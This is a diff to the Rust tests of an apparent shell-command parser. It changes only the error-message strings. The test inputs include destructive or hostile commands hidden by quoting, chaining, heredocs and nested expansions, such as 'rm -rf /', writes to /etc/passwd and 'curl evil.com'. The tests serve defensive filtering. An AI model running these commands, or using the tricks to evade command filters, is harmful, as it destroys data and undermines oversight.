@@ -1111,173 +1111,173 @@ mod tests {
 
     #[test]
     fn test_simple_command() {
-        let commands = extract_commands("ls").expect("解析失败");
+        let commands = extract_commands("ls").expect("parse failed");
         assert_eq!(commands, vec!["ls"]);
     }
 
     #[test]
     fn test_command_with_args() {
-        let commands = extract_commands("ls -la /tmp").expect("解析失败");
+        let commands = extract_commands("ls -la /tmp").expect("parse failed");
         assert_eq!(commands, vec!["ls -la /tmp"]);
     }
 
     #[test]
     fn test_single_quoted_argument_is_normalized() {
-        let commands = extract_commands("rm -rf '/'").expect("解析失败");
+        let commands = extract_commands("rm -rf '/'").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_single_quoted_command_name_is_normalized() {
-        let commands = extract_commands("'rm' -rf /").expect("解析失败");
+        let commands = extract_commands("'rm' -rf /").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_double_quoted_argument_is_normalized() {
-        let commands = extract_commands("rm -rf \"/\"").expect("解析失败");
+        let commands = extract_commands("rm -rf \"/\"").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_double_quoted_command_name_is_normalized() {
-        let commands = extract_commands("\"rm\" -rf /").expect("解析失败");
+        let commands = extract_commands("\"rm\" -rf /").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_escaped_argument_is_normalized() {
-        let commands = extract_commands("rm -rf \\/").expect("解析失败");
+        let commands = extract_commands("rm -rf \\/").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_partial_quoting_command_name_is_normalized() {
-        let commands = extract_commands("r'm' -rf /").expect("解析失败");
+        let commands = extract_commands("r'm' -rf /").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_partial_quoting_flag_is_normalized() {
-        let commands = extract_commands("rm -r'f' /").expect("解析失败");
+        let commands = extract_commands("rm -r'f' /").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf /"]);
     }
 
     #[test]
     fn test_quoted_bypass_in_chained_command() {
-        let commands = extract_commands("ls && 'rm' -rf '/'").expect("解析失败");
+        let commands = extract_commands("ls && 'rm' -rf '/'").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_tilde_preserved_after_normalization() {
-        let commands = extract_commands("rm -rf ~").expect("解析失败");
+        let commands = extract_commands("rm -rf ~").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf ~"]);
     }
 
     #[test]
     fn test_quoted_tilde_normalized() {
-        let commands = extract_commands("rm -rf '~'").expect("解析失败");
+        let commands = extract_commands("rm -rf '~'").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf ~"]);
     }
 
     #[test]
     fn test_parameter_expansion_preserved() {
-        let commands = extract_commands("rm -rf $HOME").expect("解析失败");
+        let commands = extract_commands("rm -rf $HOME").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf $HOME"]);
     }
 
     #[test]
     fn test_braced_parameter_expansion_preserved() {
-        let commands = extract_commands("rm -rf ${HOME}").expect("解析失败");
+        let commands = extract_commands("rm -rf ${HOME}").expect("parse failed");
         assert_eq!(commands, vec!["rm -rf ${HOME}"]);
     }
 
     #[test]
     fn test_and_operator() {
-        let commands = extract_commands("ls && rm -rf /").expect("解析失败");
+        let commands = extract_commands("ls && rm -rf /").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_or_operator() {
-        let commands = extract_commands("ls || rm -rf /").expect("解析失败");
+        let commands = extract_commands("ls || rm -rf /").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_semicolon() {
-        let commands = extract_commands("ls; rm -rf /").expect("解析失败");
+        let commands = extract_commands("ls; rm -rf /").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_pipe() {
-        let commands = extract_commands("ls | xargs rm -rf").expect("解析失败");
+        let commands = extract_commands("ls | xargs rm -rf").expect("parse failed");
         assert_eq!(commands, vec!["ls", "xargs rm -rf"]);
     }
 
     #[test]
     fn test_background() {
-        let commands = extract_commands("ls & rm -rf /").expect("解析失败");
+        let commands = extract_commands("ls & rm -rf /").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_command_substitution_dollar() {
-        let commands = extract_commands("echo $(whoami)").expect("解析失败");
+        let commands = extract_commands("echo $(whoami)").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.contains(&"whoami".to_string()));
     }
 
     #[test]
     fn test_command_substitution_backticks() {
-        let commands = extract_commands("echo `whoami`").expect("解析失败");
+        let commands = extract_commands("echo `whoami`").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.contains(&"whoami".to_string()));
     }
 
     #[test]
     fn test_process_substitution_input() {
-        let commands = extract_commands("cat <(ls)").expect("解析失败");
+        let commands = extract_commands("cat <(ls)").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("cat")));
         assert!(commands.contains(&"ls".to_string()));
     }
 
     #[test]
     fn test_process_substitution_output() {
-        let commands = extract_commands("ls >(cat)").expect("解析失败");
+        let commands = extract_commands("ls >(cat)").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("ls")));
         assert!(commands.contains(&"cat".to_string()));
     }
 
     #[test]
     fn test_newline_separator() {
-        let commands = extract_commands("ls\nrm -rf /").expect("解析失败");
+        let commands = extract_commands("ls\nrm -rf /").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_subshell() {
-        let commands = extract_commands("(ls && rm -rf /)").expect("解析失败");
+        let commands = extract_commands("(ls && rm -rf /)").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm -rf /"]);
     }
 
     #[test]
     fn test_mixed_operators() {
-        let commands = extract_commands("ls; echo hello && rm -rf /").expect("解析失败");
+        let commands = extract_commands("ls; echo hello && rm -rf /").expect("parse failed");
         assert_eq!(commands, vec!["ls", "echo hello", "rm -rf /"]);
     }
 
     #[test]
     fn test_no_spaces_around_operators() {
-        let commands = extract_commands("ls&&rm").expect("解析失败");
+        let commands = extract_commands("ls&&rm").expect("parse failed");
         assert_eq!(commands, vec!["ls", "rm"]);
     }
 
     #[test]
     fn test_nested_command_substitution() {
-        let commands = extract_commands("echo $(cat $(whoami).txt)").expect("解析失败");
+        let commands = extract_commands("echo $(cat $(whoami).txt)").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("cat")));
         assert!(commands.contains(&"whoami".to_string()));
@@ -1285,7 +1285,7 @@ mod tests {
 
     #[test]
     fn test_empty_command() {
-        let commands = extract_commands("").expect("解析失败");
+        let commands = extract_commands("").expect("parse failed");
         assert!(commands.is_empty());
     }
 
@@ -1309,118 +1309,118 @@ mod tests {
 
     #[test]
     fn test_redirect_write_includes_target_path() {
-        let commands = extract_commands("echo hello > /etc/passwd").expect("解析失败");
+        let commands = extract_commands("echo hello > /etc/passwd").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_redirect_append_includes_target_path() {
-        let commands = extract_commands("cat file >> /tmp/log").expect("解析失败");
+        let commands = extract_commands("cat file >> /tmp/log").expect("parse failed");
         assert_eq!(commands, vec!["cat file", ">> /tmp/log"]);
     }
 
     #[test]
     fn test_fd_redirect_handled_gracefully() {
-        let commands = extract_commands("cmd 2>&1").expect("解析失败");
+        let commands = extract_commands("cmd 2>&1").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_input_redirect() {
-        let commands = extract_commands("sort < /tmp/input").expect("解析失败");
+        let commands = extract_commands("sort < /tmp/input").expect("parse failed");
         assert_eq!(commands, vec!["sort", "< /tmp/input"]);
     }
 
     #[test]
     fn test_multiple_redirects() {
-        let commands = extract_commands("cmd > /tmp/out 2> /tmp/err").expect("解析失败");
+        let commands = extract_commands("cmd > /tmp/out 2> /tmp/err").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "> /tmp/out", "2> /tmp/err"]);
     }
 
     #[test]
     fn test_prefix_position_redirect() {
-        let commands = extract_commands("> /tmp/out echo hello").expect("解析失败");
+        let commands = extract_commands("> /tmp/out echo hello").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /tmp/out"]);
     }
 
     #[test]
     fn test_redirect_with_variable_expansion() {
-        let commands = extract_commands("echo > $HOME/file").expect("解析失败");
+        let commands = extract_commands("echo > $HOME/file").expect("parse failed");
         assert_eq!(commands, vec!["echo", "> $HOME/file"]);
     }
 
     #[test]
     fn test_output_and_error_redirect() {
-        let commands = extract_commands("cmd &> /tmp/all").expect("解析失败");
+        let commands = extract_commands("cmd &> /tmp/all").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "&> /tmp/all"]);
     }
 
     #[test]
     fn test_append_output_and_error_redirect() {
-        let commands = extract_commands("cmd &>> /tmp/all").expect("解析失败");
+        let commands = extract_commands("cmd &>> /tmp/all").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "&>> /tmp/all"]);
     }
 
     #[test]
     fn test_redirect_in_chained_command() {
         let commands =
-            extract_commands("echo hello > /tmp/out && cat /tmp/out").expect("解析失败");
+            extract_commands("echo hello > /tmp/out && cat /tmp/out").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /tmp/out", "cat /tmp/out"]);
     }
 
     #[test]
     fn test_here_string_dropped_from_normalized_output() {
-        let commands = extract_commands("cat <<< 'hello'").expect("解析失败");
+        let commands = extract_commands("cat <<< 'hello'").expect("parse failed");
         assert_eq!(commands, vec!["cat"]);
     }
 
     #[test]
     fn test_brace_group_redirect() {
-        let commands = extract_commands("{ echo hello; } > /etc/passwd").expect("解析失败");
+        let commands = extract_commands("{ echo hello; } > /etc/passwd").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_subshell_redirect() {
-        let commands = extract_commands("(cmd) > /etc/passwd").expect("解析失败");
+        let commands = extract_commands("(cmd) > /etc/passwd").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_for_loop_redirect() {
         let commands =
-            extract_commands("for f in *; do cat \"$f\"; done > /tmp/out").expect("解析失败");
+            extract_commands("for f in *; do cat \"$f\"; done > /tmp/out").expect("parse failed");
         assert_eq!(commands, vec!["cat $f", "> /tmp/out"]);
     }
 
     #[test]
     fn test_brace_group_multi_command_redirect() {
         let commands =
-            extract_commands("{ echo hello; cat; } > /etc/passwd").expect("解析失败");
+            extract_commands("{ echo hello; cat; } > /etc/passwd").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "cat", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_quoted_redirect_target_is_normalized() {
-        let commands = extract_commands("echo hello > '/etc/passwd'").expect("解析失败");
+        let commands = extract_commands("echo hello > '/etc/passwd'").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_redirect_without_space() {
-        let commands = extract_commands("echo hello >/etc/passwd").expect("解析失败");
+        let commands = extract_commands("echo hello >/etc/passwd").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_clobber_redirect() {
-        let commands = extract_commands("cmd >| /tmp/file").expect("解析失败");
+        let commands = extract_commands("cmd >| /tmp/file").expect("parse failed");
         assert_eq!(commands, vec!["cmd", ">| /tmp/file"]);
     }
 
     #[test]
     fn test_fd_to_fd_redirect_skipped() {
-        let commands = extract_commands("cmd 1>&2").expect("解析失败");
+        let commands = extract_commands("cmd 1>&2").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
@@ -1438,7 +1438,7 @@ mod tests {
 
     #[test]
     fn test_redirect_target_with_command_substitution() {
-        let commands = extract_commands("echo > $(mktemp)").expect("解析失败");
+        let commands = extract_commands("echo > $(mktemp)").expect("parse failed");
         assert_eq!(commands, vec!["echo", "> $(mktemp)", "mktemp"]);
     }
 
@@ -1451,59 +1451,59 @@ mod tests {
     #[test]
     fn test_while_loop_redirect() {
         let commands =
-            extract_commands("while true; do echo line; done > /tmp/log").expect("解析失败");
+            extract_commands("while true; do echo line; done > /tmp/log").expect("parse failed");
         assert_eq!(commands, vec!["true", "echo line", "> /tmp/log"]);
     }
 
     #[test]
     fn test_if_clause_redirect() {
         let commands =
-            extract_commands("if true; then echo yes; fi > /tmp/out").expect("解析失败");
+            extract_commands("if true; then echo yes; fi > /tmp/out").expect("parse failed");
         assert_eq!(commands, vec!["true", "echo yes", "> /tmp/out"]);
     }
 
     #[test]
     fn test_pipe_with_redirect_on_last_command() {
-        let commands = extract_commands("ls | grep foo > /tmp/out").expect("解析失败");
+        let commands = extract_commands("ls | grep foo > /tmp/out").expect("parse failed");
         assert_eq!(commands, vec!["ls", "grep foo", "> /tmp/out"]);
     }
 
     #[test]
     fn test_pipe_with_stderr_redirect_on_first_command() {
-        let commands = extract_commands("ls 2>/dev/null | grep foo").expect("解析失败");
+        let commands = extract_commands("ls 2>/dev/null | grep foo").expect("parse failed");
         assert_eq!(commands, vec!["ls", "grep foo"]);
     }
 
     #[test]
     fn test_function_definition_redirect() {
-        let commands = extract_commands("f() { echo hi; } > /tmp/out").expect("解析失败");
+        let commands = extract_commands("f() { echo hi; } > /tmp/out").expect("parse failed");
         assert_eq!(commands, vec!["echo hi", "> /tmp/out"]);
     }
 
     #[test]
     fn test_read_and_write_redirect() {
-        let commands = extract_commands("cmd <> /dev/tty").expect("解析失败");
+        let commands = extract_commands("cmd <> /dev/tty").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "<> /dev/tty"]);
     }
 
     #[test]
     fn test_case_clause_with_redirect() {
         let commands =
-            extract_commands("case $x in a) echo hi;; esac > /tmp/out").expect("解析失败");
+            extract_commands("case $x in a) echo hi;; esac > /tmp/out").expect("parse failed");
         assert_eq!(commands, vec!["echo hi", "> /tmp/out"]);
     }
 
     #[test]
     fn test_until_loop_with_redirect() {
         let commands =
-            extract_commands("until false; do echo line; done > /tmp/log").expect("解析失败");
+            extract_commands("until false; do echo line; done > /tmp/log").expect("parse failed");
         assert_eq!(commands, vec!["false", "echo line", "> /tmp/log"]);
     }
 
     #[test]
     fn test_arithmetic_for_clause_with_redirect() {
         let commands = extract_commands("for ((i=0; i<10; i++)); do echo $i; done > /tmp/out")
-            .expect("解析失败");
+            .expect("parse failed");
         assert_eq!(commands, vec!["echo $i", "> /tmp/out"]);
     }
 
@@ -1512,7 +1512,7 @@ mod tests {
         let commands = extract_commands(
             "if true; then echo a; elif false; then echo b; else echo c; fi > /tmp/out",
         )
-        .expect("解析失败");
+        .expect("parse failed");
         assert_eq!(
             commands,
             vec!["true", "echo a", "false", "echo b", "echo c", "> /tmp/out"]
@@ -1521,145 +1521,145 @@ mod tests {
 
     #[test]
     fn test_multiple_redirects_on_compound_command() {
-        let commands = extract_commands("{ cmd; } > /tmp/out 2> /tmp/err").expect("解析失败");
+        let commands = extract_commands("{ cmd; } > /tmp/out 2> /tmp/err").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "> /tmp/out", "2> /tmp/err"]);
     }
 
     #[test]
     fn test_here_document_command_substitution_extracted() {
-        let commands = extract_commands("cat <<EOF\n$(rm -rf /)\nEOF").expect("解析失败");
+        let commands = extract_commands("cat <<EOF\n$(rm -rf /)\nEOF").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("cat")));
         assert!(commands.contains(&"rm -rf /".to_string()));
     }
 
     #[test]
     fn test_here_document_quoted_delimiter_no_extraction() {
-        let commands = extract_commands("cat <<'EOF'\n$(rm -rf /)\nEOF").expect("解析失败");
+        let commands = extract_commands("cat <<'EOF'\n$(rm -rf /)\nEOF").expect("parse failed");
         assert_eq!(commands, vec!["cat"]);
     }
 
     #[test]
     fn test_here_document_backtick_substitution_extracted() {
-        let commands = extract_commands("cat <<EOF\n`whoami`\nEOF").expect("解析失败");
+        let commands = extract_commands("cat <<EOF\n`whoami`\nEOF").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("cat")));
         assert!(commands.contains(&"whoami".to_string()));
     }
 
     #[test]
     fn test_brace_group_redirect_with_command_substitution() {
-        let commands = extract_commands("{ echo hello; } > $(mktemp)").expect("解析失败");
+        let commands = extract_commands("{ echo hello; } > $(mktemp)").expect("parse failed");
         assert!(commands.contains(&"echo hello".to_string()));
         assert!(commands.contains(&"mktemp".to_string()));
     }
 
     #[test]
     fn test_function_definition_redirect_with_command_substitution() {
-        let commands = extract_commands("f() { echo hi; } > $(mktemp)").expect("解析失败");
+        let commands = extract_commands("f() { echo hi; } > $(mktemp)").expect("parse failed");
         assert!(commands.contains(&"echo hi".to_string()));
         assert!(commands.contains(&"mktemp".to_string()));
     }
 
     #[test]
     fn test_brace_group_redirect_with_process_substitution() {
-        let commands = extract_commands("{ cat; } > >(tee /tmp/log)").expect("解析失败");
+        let commands = extract_commands("{ cat; } > >(tee /tmp/log)").expect("parse failed");
         assert!(commands.contains(&"cat".to_string()));
         assert!(commands.contains(&"tee /tmp/log".to_string()));
     }
 
     #[test]
     fn test_redirect_to_dev_null_skipped() {
-        let commands = extract_commands("cmd > /dev/null").expect("解析失败");
+        let commands = extract_commands("cmd > /dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_stderr_redirect_to_dev_null_skipped() {
-        let commands = extract_commands("cmd 2>/dev/null").expect("解析失败");
+        let commands = extract_commands("cmd 2>/dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_stderr_redirect_to_dev_null_with_space_skipped() {
-        let commands = extract_commands("cmd 2> /dev/null").expect("解析失败");
+        let commands = extract_commands("cmd 2> /dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_append_redirect_to_dev_null_skipped() {
-        let commands = extract_commands("cmd >> /dev/null").expect("解析失败");
+        let commands = extract_commands("cmd >> /dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_output_and_error_redirect_to_dev_null_skipped() {
-        let commands = extract_commands("cmd &>/dev/null").expect("解析失败");
+        let commands = extract_commands("cmd &>/dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_append_output_and_error_redirect_to_dev_null_skipped() {
-        let commands = extract_commands("cmd &>>/dev/null").expect("解析失败");
+        let commands = extract_commands("cmd &>>/dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_quoted_dev_null_redirect_skipped() {
-        let commands = extract_commands("cmd 2>'/dev/null'").expect("解析失败");
+        let commands = extract_commands("cmd 2>'/dev/null'").expect("parse failed");
         assert_eq!(commands, vec!["cmd"]);
     }
 
     #[test]
     fn test_redirect_to_real_file_still_included() {
-        let commands = extract_commands("echo hello > /etc/passwd").expect("解析失败");
+        let commands = extract_commands("echo hello > /etc/passwd").expect("parse failed");
         assert_eq!(commands, vec!["echo hello", "> /etc/passwd"]);
     }
 
     #[test]
     fn test_dev_null_redirect_in_chained_command() {
         let commands =
-            extract_commands("git log 2>/dev/null || echo fallback").expect("解析失败");
+            extract_commands("git log 2>/dev/null || echo fallback").expect("parse failed");
         assert_eq!(commands, vec!["git log", "echo fallback"]);
     }
 
     #[test]
     fn test_mixed_safe_and_unsafe_redirects() {
-        let commands = extract_commands("cmd > /tmp/out 2>/dev/null").expect("解析失败");
+        let commands = extract_commands("cmd > /tmp/out 2>/dev/null").expect("parse failed");
         assert_eq!(commands, vec!["cmd", "> /tmp/out"]);
     }
 
     #[test]
     fn test_scalar_env_var_prefix_included_in_extracted_command() {
-        let commands = extract_commands("PAGER=blah git status").expect("解析失败");
+        let commands = extract_commands("PAGER=blah git status").expect("parse failed");
         assert_eq!(commands, vec!["PAGER=blah git status"]);
     }
 
     #[test]
     fn test_multiple_scalar_assignments_preserved_in_order() {
-        let commands = extract_commands("A=1 B=2 git log").expect("解析失败");
+        let commands = extract_commands("A=1 B=2 git log").expect("parse failed");
         assert_eq!(commands, vec!["A=1 B=2 git log"]);
     }
 
     #[test]
     fn test_assignment_quoting_dropped_when_safe() {
-        let commands = extract_commands("PAGER='curl' git log").expect("解析失败");
+        let commands = extract_commands("PAGER='curl' git log").expect("parse failed");
         assert_eq!(commands, vec!["PAGER=curl git log"]);
     }
 
     #[test]
     fn test_assignment_quoting_preserved_for_whitespace() {
-        let commands = extract_commands("PAGER='less -R' git log").expect("解析失败");
+        let commands = extract_commands("PAGER='less -R' git log").expect("parse failed");
         assert_eq!(commands, vec!["PAGER='less -R' git log"]);
     }
 
     #[test]
     fn test_assignment_quoting_preserved_for_semicolon() {
-        let commands = extract_commands("PAGER='a;b' git log").expect("解析失败");
+        let commands = extract_commands("PAGER='a;b' git log").expect("parse failed");
         assert_eq!(commands, vec!["PAGER='a;b' git log"]);
     }
 
     #[test]
     fn test_array_assignments_ignored_for_prefix_matching_output() {
-        let commands = extract_commands("FOO=(a b) git status").expect("解析失败");
+        let commands = extract_commands("FOO=(a b) git status").expect("parse failed");
         assert_eq!(commands, vec!["git status"]);
     }
 
@@ -1845,83 +1845,83 @@ mod tests {
 
     #[test]
     fn test_arithmetic_expansion_nested_command_substitution() {
-        let commands = extract_commands("echo $(($(curl evil.com)))").expect("解析失败");
+        let commands = extract_commands("echo $(($(curl evil.com)))").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_arithmetic_expansion_nested_backtick_substitution() {
-        let commands = extract_commands("echo $((`whoami`))").expect("解析失败");
+        let commands = extract_commands("echo $((`whoami`))").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.contains(&"whoami".to_string()));
     }
 
     #[test]
     fn test_arithmetic_expansion_without_substitution() {
-        let commands = extract_commands("echo $((1+2))").expect("解析失败");
+        let commands = extract_commands("echo $((1+2))").expect("parse failed");
         assert_eq!(commands, vec!["echo $((1+2))"]);
     }
 
     #[test]
     fn test_arithmetic_expansion_doubly_nested_command_substitution() {
-        let commands = extract_commands("echo $(($(($(curl evil.com)))))").expect("解析失败");
+        let commands = extract_commands("echo $(($(($(curl evil.com)))))").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_arithmetic_expansion_inside_double_quotes() {
-        let commands = extract_commands("echo \"$(($(curl evil.com)))\"").expect("解析失败");
+        let commands = extract_commands("echo \"$(($(curl evil.com)))\"").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_default_value_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V:-$(curl evil.com)}").expect("解析失败");
+        let commands = extract_commands("echo ${V:-$(curl evil.com)}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_assign_default_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V:=$(curl evil.com)}").expect("解析失败");
+        let commands = extract_commands("echo ${V:=$(curl evil.com)}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_alternative_value_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V:+$(curl evil.com)}").expect("解析失败");
+        let commands = extract_commands("echo ${V:+$(curl evil.com)}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_error_message_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V:?$(curl evil.com)}").expect("解析失败");
+        let commands = extract_commands("echo ${V:?$(curl evil.com)}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_replacement_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V/x/$(curl evil.com)}").expect("解析失败");
+        let commands = extract_commands("echo ${V/x/$(curl evil.com)}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_suffix_pattern_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V%$(curl evil.com)}").expect("解析失败");
+        let commands = extract_commands("echo ${V%$(curl evil.com)}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
 
     #[test]
     fn test_parameter_expansion_substring_offset_extracts_command_substitution() {
-        let commands = extract_commands("echo ${V:$(($(curl evil.com))):1}").expect("解析失败");
+        let commands = extract_commands("echo ${V:$(($(curl evil.com))):1}").expect("parse failed");
         assert!(commands.iter().any(|c| c.contains("echo")));
         assert!(commands.iter().any(|c| c.contains("curl")));
     }
